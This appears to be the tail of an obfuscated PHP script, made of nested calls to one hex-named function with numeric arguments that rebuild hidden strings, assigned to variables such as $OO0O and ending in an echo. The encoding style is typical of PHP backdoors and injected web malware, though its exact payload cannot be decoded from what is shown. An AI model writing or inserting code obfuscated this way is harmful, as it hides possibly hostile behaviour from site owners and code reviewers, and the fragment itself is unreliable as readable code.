O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(2,1)),O5c42ffd3(-4,O5c42ffd3(1,5)),O5c42ffd3(-4,O5c42ffd3(1,6)),O5c42ffd3(-4,O5c42ffd3(8,7)),O5c42ffd3(-4,O5c42ffd3(8,8)),O5c42ffd3(-4,O5c42ffd3(8,9))),O5c42ffd3(-7,O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(4,6)),O5c42ffd3(-4,O5c42ffd3(1,9,4)),O5c42ffd3(-4,O5c42ffd3(1,9,5)),O5c42ffd3(-4,9),O5c42ffd3(-4,O5c42ffd3(1,0)),O5c42ffd3(-4,O5c42ffd3(1,9,6)),O5c42ffd3(-4,O5c42ffd3(1,9,7)),O5c42ffd3(-4,O5c42ffd3(1,9,8)),O5c42ffd3(-4,O5c42ffd3(1,9,9)),O5c42ffd3(-4,O5c42ffd3(7,1)),O5c42ffd3(-4,O5c42ffd3(7,2)),O5c42ffd3(-4,O5c42ffd3(7,3)),O5c42ffd3(-4,O5c42ffd3(7,4)),O5c42ffd3(-4,O5c42ffd3(2,0,0)),O5c42ffd3(-4,O5c42ffd3(1,2,0)),O5c42ffd3(-4,O5c42ffd3(1,4,4))),O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(5,5)),O5c42ffd3(-4,O5c42ffd3(5,3)),O5c42ffd3(-4,O5c42ffd3(6,1)),O5c42ffd3(-4,O5c42ffd3(6,2)),O5c42ffd3(-4,O5c42ffd3(6,3)),O5c42ffd3(-4,O5c42ffd3(2,0,9)),O5c42ffd3(-4,O5c42ffd3(2,1,0)),O5c42ffd3(-4,O5c42ffd3(1,2,0)),O5c42ffd3(-4,O5c42ffd3(1,4,4))),$OO0O)) ; O5c42ffd3(O5c42ffd3(-6,O5c42ffd3(-4,O5c42ffd3(7,6)),O5c42ffd3(-4,O5c42ffd3(7,7)),O5c42ffd3(-4,O5c42ffd3(1,4,7)),O5c42ffd3(-4,O5c42ffd3(1,5,2)),O5c42ffd3(-4,O5c42ffd3(1,5,3))),O5c42ffd3(-7,$OO00)) ; echo $OO0O; ?>